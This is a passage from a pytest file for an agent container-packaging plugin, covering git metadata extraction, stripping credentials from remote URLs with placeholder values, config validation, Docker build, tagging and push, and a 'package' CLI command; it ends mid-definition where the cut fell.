        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="abc123def456\n")
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["revision"] == "abc123def456"

    def test_revision_empty_on_git_failure(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.side_effect = FileNotFoundError
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["revision"] == ""

    def test_source_from_git(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="https://github.com/org/repo.git\n")
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["source"] == "https://github.com/org/repo.git"

    def test_source_empty_on_git_failure(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.side_effect = FileNotFoundError
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["source"] == ""

    def test_source_strips_embedded_credentials(self, agent_config: Path) -> None:
        """Never leak PATs, passwords, or OAuth tokens into the image source label.

        Covers every remote-URL shape we've seen developers use: GitLab PAT,
        HTTP basic auth, GitHub oauth2 token, SSH (no creds), plain HTTPS
        (no creds), and a malformed URL (returned unchanged, best-effort).
        """
        from nemo_agents_plugin.container.metadata import _strip_credentials, extract_agent_metadata

        # Direct helper — exhaustive scheme/credential combinations.
        # Credentialed URLs are assembled at runtime from neutral ``user`` /
        # ``token`` placeholders so the source file never contains a literal
        # ``scheme://X:Y@host`` substring that secret scanners (TruffleHog,
        # gitleaks) flag as an unverified URI on push.
        # The bare-userinfo case (no ``:``) is kept because it exercises a
        # different branch in ``_strip_credentials`` than the basic-auth
        # ``user:token`` form.
        user, token = "user", "token"
        gl_host = "gitlab-master.nvidia.com"
        gh_host = "github.com"
        gl_basic = f"https://{user}:{token}@{gl_host}/org/repo.git"
        gl_token_only = f"https://{token}@{gl_host}/org/repo.git"
        gh_basic = f"https://{user}:{token}@{gh_host}/org/repo.git"
        cases = {
            gl_basic: f"https://{gl_host}/org/repo.git",
            gl_token_only: f"https://{gl_host}/org/repo.git",
            gh_basic: f"https://{gh_host}/org/repo.git",
            f"https://{gh_host}/org/repo.git": f"https://{gh_host}/org/repo.git",
            f"git@{gl_host}:aire/microservices/nmp.git": f"git@{gl_host}:aire/microservices/nmp.git",
            f"ssh://git@{gl_host}:12051/aire/microservices/nmp.git": f"ssh://git@{gl_host}:12051/aire/microservices/nmp.git",
            "": "",
        }
        for raw, expected in cases.items():
            assert _strip_credentials(raw) == expected, f"failed for {raw!r}"

        # End-to-end: a credential-bearing remote must not survive into meta["source"].
        pat_url = f"https://{user}:{token}@{gl_host}/owner/x.git"
        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout=pat_url + "\n")
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert token not in meta["source"]
        assert f"{user}:" not in meta["source"]
        assert meta["source"] == f"https://{gl_host}/owner/x.git"


# ---------------------------------------------------------------------------
# Validator tests
# ---------------------------------------------------------------------------


class TestValidateAgentConfig:
    def test_valid_config_passes(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        result = validate_agent_config(agent_config)
        assert result.valid
        assert result.errors == []

    def test_invalid_yaml(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "bad.yaml"
        p.write_text("{{invalid yaml: [}")
        result = validate_agent_config(p)
        assert not result.valid
        assert any("YAML parse error" in e for e in result.errors)

    def test_missing_workflow_key(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("functions:\n  foo:\n    _type: bar\n")

        result = validate_agent_config(p)
        assert not result.valid
        assert any("workflow" in e for e in result.errors)

    def test_unknown_workflow_type_warns_does_not_fail(self, tmp_path: Path) -> None:
        """Unknown ``workflow._type`` is a soft warning, not a hard error.

        NAT plugins can register additional workflow types at runtime; a
        closed allowlist here used to hard-fail on otherwise-valid configs
        and force operators to ``--skip-validation``.  The check now
        surfaces unfamiliar types as warnings and lets the build proceed.
        """
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("workflow:\n  _type: unknown_agent_type\n")

        result = validate_agent_config(p)
        assert result.valid, f"unknown type should not block validation; got errors: {result.errors}"
        assert any("unknown_agent_type" in w for w in result.warnings)
        # Built-in known types are still listed in the message so operators
        # can quickly tell whether they made a typo vs. invoked a plugin.
        assert any("react_agent" in w for w in result.warnings)

    def test_known_workflow_types_pass(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        for wf_type in (
            "react_agent",
            "tool_calling_agent",
            "reasoning_agent",
            "rewoo_agent",
        ):
            p = tmp_path / f"{wf_type}.yaml"
            p.write_text(f"workflow:\n  _type: {wf_type}\n")
            result = validate_agent_config(p)
            assert result.valid, f"Expected {wf_type} to pass validation"
            assert result.warnings == []

    def test_missing_tool_reference(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text(
            "functions:\n  existing_fn:\n    _type: foo\n"
            "workflow:\n  _type: react_agent\n  tool_names: [existing_fn, ghost_fn]\n"
        )

        result = validate_agent_config(p)
        assert not result.valid
        assert any("ghost_fn" in e for e in result.errors)
        assert not any("existing_fn" in e for e in result.errors)

    def test_function_groups_satisfy_tool_names(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text(
            "function_groups:\n  calculator:\n    _type: calculator\n"
            "workflow:\n  _type: react_agent\n  tool_names: [calculator]\n"
        )

        result = validate_agent_config(p)
        assert result.valid

    def test_missing_llm_reference(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text(
            "llms:\n  real_llm:\n    _type: openai\nworkflow:\n  _type: react_agent\n  llm_name: missing_llm\n"
        )

        result = validate_agent_config(p)
        assert not result.valid
        assert any("missing_llm" in e for e in result.errors)

    def test_non_dict_root(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("- item1\n- item2\n")

        result = validate_agent_config(p)
        assert not result.valid
        assert any("mapping" in e for e in result.errors)

    def test_workflow_not_a_dict(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("workflow: just_a_string\n")

        result = validate_agent_config(p)
        assert not result.valid
        assert any("mapping" in e for e in result.errors)

    def test_workflow_without_type_is_rejected(self, tmp_path: Path) -> None:
        """A workflow lacking ``_type`` must fail validation.

        Regression: the original validator only flagged *unknown* types
        and short-circuited on missing/empty ones, so a config like
        ``workflow: { tool_names: [] }`` was accepted — only for the
        downstream ``nat serve`` to crash inside the built container.
        The validator now treats both missing-type and empty-string-type
        as errors and lists the allowed values in the message so the
        operator can fix it without re-checking the docs.
        """
        from nemo_agents_plugin.container.validator import _KNOWN_WORKFLOW_TYPES, validate_agent_config

        for body in ("workflow:\n  tool_names: []\n", 'workflow:\n  _type: ""\n  tool_names: []\n'):
            p = tmp_path / "config.yaml"
            p.write_text(body)
            result = validate_agent_config(p)
            assert not result.valid
            assert any("workflow._type" in e for e in result.errors)
            # Allowed values are surfaced so the message is actionable.
            for known in _KNOWN_WORKFLOW_TYPES:
                assert any(known in e for e in result.errors)

    def test_multiple_errors_collected(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("workflow:\n  _type: invalid_type\n  tool_names: [ghost1, ghost2]\n  llm_name: phantom\n")

        result = validate_agent_config(p)
        assert not result.valid
        assert len(result.errors) >= 3

    def test_unreadable_config_returns_structured_error(self, tmp_path: Path) -> None:
        """``read_text`` failures surface as ``ValidationResult``, not tracebacks.

        Two paths exercised: missing file (``FileNotFoundError``) and a
        non-UTF-8 binary blob (``UnicodeDecodeError``).  Both must produce a
        ``valid=False`` result with an explanatory error so the CLI builder
        path can print a clean "Agent config validation failed" message
        instead of leaking an ``OSError`` traceback to the operator.
        """
        from nemo_agents_plugin.container.validator import validate_agent_config

        missing = tmp_path / "no_such.yaml"
        result_missing = validate_agent_config(missing)
        assert not result_missing.valid
        assert any("Unable to read config file" in e for e in result_missing.errors)

        binary = tmp_path / "binary.yaml"
        # 0x80 is invalid as a UTF-8 leading byte → ``UnicodeDecodeError``.
        binary.write_bytes(b"\x80\x81\x82")
        result_binary = validate_agent_config(binary)
        assert not result_binary.valid
        assert any("not valid UTF-8" in e for e in result_binary.errors)

    def test_malformed_workflow_fields_are_rejected(self, tmp_path: Path) -> None:
        """tool_names / llm_name / llms with the wrong YAML type must error.

        Regression: ``isinstance(tool_names, list)`` and the analogous
        ``isinstance(llms, dict)`` guards used to silently skip validation
        when the YAML had ``tool_names: my_tool`` (string) or
        ``llms: [...]`` (list).  A non-string ``llm_name`` could even
        raise ``TypeError`` at the membership check.  All three malformed
        shapes now produce structured errors before any membership lookup.
        """
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        # All three malformed shapes packed into one config so a single
        # validation pass exercises every new rejection branch.
        p.write_text(
            "workflow:\n"
            "  _type: react_agent\n"
            "  tool_names: my_tool\n"  # string, must be list
            "  llm_name: [a, b]\n"  # list, must be string
            "llms:\n"
            "  - first\n"  # list, must be mapping
        )
        result = validate_agent_config(p)
        assert not result.valid
        joined = " || ".join(result.errors)
        assert "workflow.tool_names must be a list" in joined
        assert "workflow.llm_name must be a string" in joined
        # ``llms`` mapping error is only checked when ``llm_name`` is a
        # valid string, so verify it in its own minimal config.
        p2 = tmp_path / "config2.yaml"
        p2.write_text("workflow:\n  _type: react_agent\n  llm_name: x\nllms:\n  - first\n")
        result2 = validate_agent_config(p2)
        assert not result2.valid
        assert any("'llms' must be a mapping" in e for e in result2.errors)


# ---------------------------------------------------------------------------
# Build tests
# ---------------------------------------------------------------------------


class TestDetectAgentConfigFormat:
    def test_missing_config_format_defaults_to_nat(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import detect_agent_config_format
        from nemo_agents_plugin.entities import NAT_WORKFLOW_CONFIG_FORMAT

        assert detect_agent_config_format(agent_config) == NAT_WORKFLOW_CONFIG_FORMAT

    def test_detects_platform_agent_config(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import detect_agent_config_format
        from nemo_agents_plugin.entities import NEMO_AGENTS_SPEC_CONFIG_FORMAT

        config = tmp_path / "agent.yaml"
        config.write_text("config_format: nemo-agents-spec-v1\nname: fabric-agent\n")

        assert detect_agent_config_format(config) == NEMO_AGENTS_SPEC_CONFIG_FORMAT

    @pytest.mark.parametrize(
        ("content", "error"),
        [
            ("config_format: future-format-v99\n", "Unsupported agent config format"),
            ("config_format: [unterminated\n", "YAML parse error"),
        ],
    )
    def test_rejects_invalid_config(self, tmp_path: Path, content: str, error: str) -> None:
        from nemo_agents_plugin.container.builder import detect_agent_config_format

        config = tmp_path / "agent.yaml"
        config.write_text(content)

        with pytest.raises(ValueError, match=error):
            detect_agent_config_format(config)

    def test_wraps_read_errors(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import detect_agent_config_format

        with pytest.raises(ValueError, match="Unable to read config file"):
            detect_agent_config_format(tmp_path / "missing.yaml")

        binary = tmp_path / "binary.yaml"
        binary.write_bytes(b"\x80\x81\x82")
        with pytest.raises(ValueError, match="Config file is not valid UTF-8"):
            detect_agent_config_format(binary)


class TestBuildAgentImage:
    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_with_provided_dockerfile(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        dockerfile = agent_config.parent / "Dockerfile"
        dockerfile.write_text("FROM ubuntu")
        mock_build.return_value = "my-agent:latest"

        result = build_nat_agent_image(
            agent_config,
            dockerfile=dockerfile,
            tag="my-agent:latest",
            nat_version="1.4.0",
        )

        assert result == "my-agent:latest"
        mock_build.assert_called_once()
        assert mock_build.call_args.kwargs["dockerfile"] == dockerfile

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_renders_on_the_fly(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        mock_build.return_value = "config-abc123:0.0.0"

        build_nat_agent_image(agent_config, nat_version="1.4.0", agent_author="x")

        tag = mock_build.call_args.kwargs["tag"]
        assert tag.startswith("config-")
        assert ":" in tag
        mock_build.assert_called_once()
        assert not (agent_config.parent / "Dockerfile.generated").exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_cleans_up_dockerignore(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        mock_build.return_value = "config-abc:0.0.0"
        build_nat_agent_image(agent_config, nat_version="1.4.0", generate_ignore=True, agent_author="x")

        assert not (agent_config.parent / ".dockerignore").exists()
        assert not (agent_config.parent / "Dockerfile.generated").exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_preserves_committed_plugin_managed_dockerignore(
        self, mock_build: MagicMock, agent_config: Path
    ) -> None:
        """A pre-existing committed ``.dockerignore`` must survive a build.

        Regression: ``render_dockerignore`` regenerates plugin-managed
        files in place (sentinel match = "safe to refresh") and returns
        the path.  The build path used to treat any returned path as a
        transient artifact and unlinked it in the ``finally`` cleanup —
        which deleted a committed-and-checked-in ``.dockerignore`` whose
        sentinel header marked it as plugin-managed.  Cleanup now only
        deletes files this run actually *created* (file did not exist
        before the build).  Both content and existence are checked.
        """
        from nemo_agents_plugin.container.builder import build_nat_agent_image
        from nemo_agents_plugin.container.template import DOCKERIGNORE_SENTINEL

        ignore = agent_config.parent / ".dockerignore"
        committed = f"{DOCKERIGNORE_SENTINEL}\n# user-committed tweak\nignore-me/\n"
        ignore.write_text(committed)

        mock_build.return_value = "config-abc:0.0.0"
        build_nat_agent_image(agent_config, nat_version="1.4.0", generate_ignore=True, agent_author="x")

        assert ignore.exists(), "committed .dockerignore was deleted by build cleanup"
        # Content may have been regenerated (sentinel-marked = safe to
        # refresh), so we only assert the sentinel header survived — the
        # file is still there for the next ``docker build`` to consume.
        assert ignore.read_text().splitlines()[0] == DOCKERIGNORE_SENTINEL

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_no_ignore(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        mock_build.return_value = "config-abc:0.0.0"
        build_nat_agent_image(agent_config, nat_version="1.4.0", generate_ignore=False, agent_author="x")

        assert not (agent_config.parent / ".dockerignore").exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_default_tag_from_metadata(self, mock_build: MagicMock, project_dir: tuple[Path, Path]) -> None:
        """Default tag follows the ``{agent_name}-{agent_id}:{agent_version}`` convention."""
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        config, pyproject = project_dir
        mock_build.return_value = "placeholder"

        build_nat_agent_image(config, pyproject=pyproject, nat_version="1.4.0", agent_author="x")

        tag = mock_build.call_args.kwargs["tag"]
        assert tag.startswith("test-agent-"), f"Expected tag to start with 'test-agent-', got {tag}"
        name_id, version = tag.rsplit(":", 1)
        assert version == "2.3.0"
        agent_id_part = name_id.split("-", 2)[-1]
        assert len(agent_id_part) == 12, f"agent_id should be 12-char hex, got '{agent_id_part}'"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_runs_validation_by_default(self, mock_build: MagicMock, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        bad = tmp_path / "bad.yaml"
        bad.write_text("no_workflow_here: true\n")
        mock_build.return_value = "x:latest"

        with pytest.raises(AgentConfigValidationError):
            build_nat_agent_image(bad, nat_version="1.0.0")

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_skip_validation(self, mock_build: MagicMock, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        bad = tmp_path / "bad.yaml"
        bad.write_text("no_workflow_here: true\n")
        mock_build.return_value = "x:latest"

        result = build_nat_agent_image(bad, nat_version="1.0.0", skip_validation=True)
        assert result == "x:latest"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_passes_allow_root(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        mock_build.return_value = "x:latest"
        build_nat_agent_image(agent_config, nat_version="1.0.0", allow_root=True)

        call_kwargs = mock_build.call_args.kwargs
        dockerfile = call_kwargs["dockerfile"]
        assert not dockerfile.exists()  # cleaned up

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_with_external_template(self, mock_build: MagicMock, agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        tpl = tmp_path / "custom.j2"
        tpl.write_text("FROM scratch\nRUN echo {{ nat_version }}")
        mock_build.return_value = "x:latest"

        build_nat_agent_image(agent_config, nat_version="5.0.0", template_path=str(tpl))

        call_kwargs = mock_build.call_args.kwargs
        assert "5.0.0" in call_kwargs["build_args"]["NAT_VERSION"]

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_cleanup_on_failure(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        mock_build.side_effect = SystemExit(1)

        with pytest.raises((SystemExit, ClickExit)):
            build_nat_agent_image(agent_config, nat_version="1.0.0")

        assert not (agent_config.parent / "Dockerfile.generated").exists()
        assert not (agent_config.parent / ".dockerignore").exists()


# ---------------------------------------------------------------------------
# Default tag tests
# ---------------------------------------------------------------------------


class TestDefaultTag:
    """Tests for the ``{agent_name}-{agent_id}:{agent_version}`` convention."""

    def test_config_only_fallback(self, agent_config: Path) -> None:
        import re

        from nemo_agents_plugin.container.builder import _default_tag

        tag = _default_tag(agent_config, agent_author="x")
        name_id, version = tag.rsplit(":", 1)
        assert name_id.startswith("config-")
        assert re.match(r"\d{2}\.\d{2}\.\d{2}$", version), f"Expected YY.MM.DD, got {version}"
        assert len(name_id.split("-", 1)[1]) == 12

    def test_with_pyproject(self, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.builder import _default_tag

        config, pyproject = project_dir
        tag = _default_tag(config, pyproject, agent_author="x")
        name_id, version = tag.rsplit(":", 1)
        assert name_id.startswith("test-agent-")
        assert version == "2.3.0"

    def test_explicit_version_override(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import _default_tag

        tag = _default_tag(agent_config, agent_version="5.0.0", agent_author="x")
        assert tag.endswith(":5.0.0")

    def test_deterministic(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import _default_tag

        t1 = _default_tag(agent_config, agent_author="x")
        t2 = _default_tag(agent_config, agent_author="x")
        name1, _ = t1.rsplit(":", 1)
        name2, _ = t2.rsplit(":", 1)
        assert name1 == name2


# ---------------------------------------------------------------------------
# Publish tests
# ---------------------------------------------------------------------------


class TestDockerPush:
    def _call_push(self, mock_docker: MagicMock, **kwargs: Any) -> str:
        import sys
        from importlib import reload

        from nemo_agents_plugin.container import publisher

        fake_module = MagicMock(docker=mock_docker)
        with patch.dict(sys.modules, {"python_on_whales": fake_module}):
            reload(publisher)
            return publisher.docker_push(**kwargs)

    def test_push_computes_remote_tag(self) -> None:
        mock_docker = MagicMock()
        self._call_push(
            mock_docker,
            local_tag="agent:2.0",
            registry="registry.example.com/team",
        )
        expected_remote = "registry.example.com/team/agent:2.0"
        mock_docker.tag.assert_called_once_with("agent:2.0", expected_remote)
        mock_docker.push.assert_called_once_with(expected_remote)

    def test_push_with_explicit_push_tag(self) -> None:
        mock_docker = MagicMock()
        self._call_push(
            mock_docker,
            local_tag="my-agent:1.0",
            registry="nvcr.io/org",
            push_tag="nvcr.io/org/custom:v1",
        )
        mock_docker.tag.assert_called_once_with("my-agent:1.0", "nvcr.io/org/custom:v1")
        mock_docker.push.assert_called_once_with("nvcr.io/org/custom:v1")

    def test_push_strips_trailing_slash(self) -> None:
        mock_docker = MagicMock()
        self._call_push(
            mock_docker,
            local_tag="img:v1",
            registry="nvcr.io/org/",
        )
        mock_docker.tag.assert_called_once_with("img:v1", "nvcr.io/org/img:v1")

    def test_source_ref_is_tagged_instead_of_the_mutable_local_tag(self) -> None:
        """docker.tag() must read from the resolved image ID, not the local_tag name,

        or a concurrent build that rebinds local_tag between build and push would
        make this job publish the wrong image.
        """
        mock_docker = MagicMock()
        self._call_push(
            mock_docker,
            local_tag="agent:2.0",
            registry="registry.example.com/team",
            source_ref="sha256:abc123",
        )
        expected_remote = "registry.example.com/team/agent:2.0"
        mock_docker.tag.assert_called_once_with("sha256:abc123", expected_remote)
        mock_docker.push.assert_called_once_with(expected_remote)

    def test_missing_source_ref_falls_back_to_local_tag(self) -> None:
        mock_docker = MagicMock()
        self._call_push(
            mock_docker,
            local_tag="agent:2.0",
            registry="registry.example.com/team",
        )
        mock_docker.tag.assert_called_once_with("agent:2.0", "registry.example.com/team/agent:2.0")


class TestResolveImageId:
    def _call(self, mock_docker: MagicMock, tag: str) -> str:
        import sys
        from importlib import reload

        from nemo_agents_plugin.container import builder

        fake_module = MagicMock(docker=mock_docker)
        with patch.dict(sys.modules, {"python_on_whales": fake_module}):
            reload(builder)
            return builder.resolve_image_id(tag)

    def test_returns_the_inspected_image_id(self) -> None:
        mock_docker = MagicMock()
        mock_docker.image.inspect.return_value.id = "sha256:deadbeef"

        result = self._call(mock_docker, "agent:1.0")

        mock_docker.image.inspect.assert_called_once_with("agent:1.0")
        assert result == "sha256:deadbeef"

    def test_inspect_failure_is_wrapped(self) -> None:
        from nemo_agents_plugin.container.errors import ImageBuildError

        mock_docker = MagicMock()
        mock_docker.image.inspect.side_effect = RuntimeError("no such image")

        with pytest.raises(ImageBuildError, match="no such image"):
            self._call(mock_docker, "agent:1.0")


# ---------------------------------------------------------------------------
# resolve_value tests
# ---------------------------------------------------------------------------


class TestResolveValue:
    def test_explicit_wins(self) -> None:
        from nemo_agents_plugin.container.template import resolve_value

        assert resolve_value("base_image_url", "explicit") == "explicit"

    def test_env_var_fallback(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from nemo_agents_plugin.container.template import resolve_value

        monkeypatch.setenv("NAT_VERSION", "envval")
        assert resolve_value("nat_version") == "envval"

    def test_default_fallback(self) -> None:
        from nemo_agents_plugin.container.template import resolve_value

        assert resolve_value("python_version") == "3.13"

    def test_required_raises(self) -> None:
        from nemo_agents_plugin.container.template import resolve_value

        # Names not in _DEFAULTS and not in _ENV_MAP must raise — every real
        # parameter now has a default, so use an unknown key to cover the
        # 'unresolvable required' branch.
        with pytest.raises(ValueError, match="nonexistent_param"):
            resolve_value("nonexistent_param")


# ---------------------------------------------------------------------------
# End-to-end integration test
# ---------------------------------------------------------------------------


class TestEndToEndPipeline:
    """Integration test exercising render → build → publish in sequence."""

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_render_then_build_then_publish(self, mock_build: MagicMock, agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image
        from nemo_agents_plugin.container.template import render_dockerignore, render_nat_dockerfile

        rendered = render_nat_dockerfile(
            agent_config,
            None,
            nat_version="1.4.0",
            agent_version="1.0.0",
            agent_author="e2e-test",
        )
        assert "USER agent" in rendered
        assert 'org.opencontainers.image.version="1.0.0"' in rendered
        assert 'org.opencontainers.image.authors="e2e-test"' in rendered
        assert "--no-install-recommends" in rendered

        dockerfile_path = tmp_path / "Dockerfile"
        dockerfile_path.write_text(rendered)

        ignore_path = render_dockerignore(tmp_path)
        assert ignore_path is not None  # narrow Path | None
        assert ignore_path.exists()

        mock_build.return_value = "e2e-agent:1.0.0"
        tag = build_nat_agent_image(
            agent_config,
            dockerfile=dockerfile_path,
            tag="e2e-agent:1.0.0",
            nat_version="1.4.0",
        )
        assert tag == "e2e-agent:1.0.0"

        mock_docker = MagicMock()
        import sys
        from importlib import reload
        from unittest.mock import patch as _patch

        from nemo_agents_plugin.container import publisher

        fake_module = MagicMock(docker=mock_docker)
        with _patch.dict(sys.modules, {"python_on_whales": fake_module}):
            reload(publisher)
            remote = publisher.docker_push(
                local_tag="e2e-agent:1.0.0",
                registry="nvcr.io/test-org",
            )

        assert remote == "nvcr.io/test-org/e2e-agent:1.0.0"
        mock_docker.tag.assert_called_once()
        mock_docker.push.assert_called_once()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_full_pipeline_with_project_mode(self, mock_build: MagicMock, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image
        from nemo_agents_plugin.container.validator import validate_agent_config

        config, pyproject = project_dir

        validation = validate_agent_config(config)
        assert validation.valid

        mock_build.return_value = "placeholder"
        build_nat_agent_image(
            config,
            pyproject=pyproject,
            nat_version="1.4.0",
            agent_version="2.3.0",
            agent_author="proj-test",
        )

        actual_tag = mock_build.call_args.kwargs["tag"]
        assert actual_tag.startswith("test-agent-")
        assert actual_tag.endswith(":2.3.0")

        built_dockerfile = mock_build.call_args.kwargs["dockerfile"]
        assert not built_dockerfile.exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_validation_blocks_bad_config(self, mock_build: MagicMock, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        bad = tmp_path / "bad_agent.yaml"
        bad.write_text("llms:\n  x: {}\n")

        with pytest.raises(AgentConfigValidationError):
            build_nat_agent_image(bad, nat_version="1.0.0")

        mock_build.assert_not_called()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_external_template_e2e(self, mock_build: MagicMock, agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        custom_tpl = tmp_path / "tpl.j2"
        custom_tpl.write_text(
            "FROM alpine\nLABEL agent={{ agent_name }} version={{ agent_version }}\nRUN echo {{ nat_version }}\n"
        )

        rendered = render_nat_dockerfile(
            agent_config,
            None,
            nat_version="7.0.0",
            agent_version="1.2.3",
            template_path=str(custom_tpl),
        )

        assert "FROM alpine" in rendered
        assert "agent=config" in rendered
        assert "version=1.2.3" in rendered
        assert "echo 7.0.0" in rendered

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_allow_root_e2e(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        mock_build.return_value = "root-agent:latest"
        build_nat_agent_image(agent_config, nat_version="1.0.0", allow_root=True)

        generated = agent_config.parent / "Dockerfile.generated"
        content = generated.read_text() if generated.exists() else ""
        assert "USER agent" not in content


# ---------------------------------------------------------------------------
# `nemo agents package` CLI command
# ---------------------------------------------------------------------------


@pytest.fixture()
def package_cli():
    """Return a Typer app with only the ``package`` command registered.

    A no-op callback keeps the app in multi-command mode so ``package``
    must be invoked explicitly (matching real ``nemo agents package`` usage).
    """
    import typer
    from nemo_agents_plugin.cli import _register_package_command
    from typer.testing import CliRunner

    app = typer.Typer(no_args_is_help=True)

    @app.callback()
    def _root() -> None:
        pass

    _register_package_command(app)
    return app, CliRunner()


class TestPackageCommand:
    """Tests for the unified ``nemo agents package`` CLI command."""

    def test_no_build_renders_dockerfile_and_ignore(self, package_cli, agent_config: Path, tmp_path: Path) -> None:
        """``--no-build`` emits Dockerfile + .dockerignore and never calls the builder."""
        app, runner = package_cli
        output = tmp_path / "Dockerfile"

        with (
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.5.0",
                    "--output",
                    str(output),
                    "--no-build",
                ],
            )

        assert result.exit_code == 0, result.stdout
        assert output.exists()
        assert (output.parent / ".dockerignore").exists()
        assert "Dockerfile written to" in result.stdout
        mock_build.assert_not_called()
        mock_push.assert_not_called()

    def test_fabric_no_build_renders_fabric_dockerfile_and_ignore(
        self, package_cli, fabric_agent_config: Path, tmp_path: Path
    ) -> None:
        """Fabric ``--no-build`` renders without invoking either image builder."""
        app, runner = package_cli
        output = tmp_path / "Dockerfile.fabric"

        with (
            patch("nemo_agents_plugin.container.builder.build_fabric_agent_image") as mock_fabric_build,
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_nat_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(fabric_agent_config),
                    "--output",
                    str(output),
                    "--no-build",
                ],
            )

        assert result.exit_code == 0, result.stdout
        rendered = output.read_text()
        assert "nemo_agents_plugin.fabric.server" in rendered
        assert "ENV AGENT_CONFIG_PATH=/workspace/agent.yaml" in rendered
        assert "NAT_VERSION" not in rendered
        assert (tmp_path / ".dockerignore").exists()
        assert "Dockerfile written to" in result.stdout
        mock_fabric_build.assert_not_called()
        mock_nat_build.assert_not_called()
        mock_push.assert_not_called()

    def test_fabric_no_build_forwards_shared_flags(
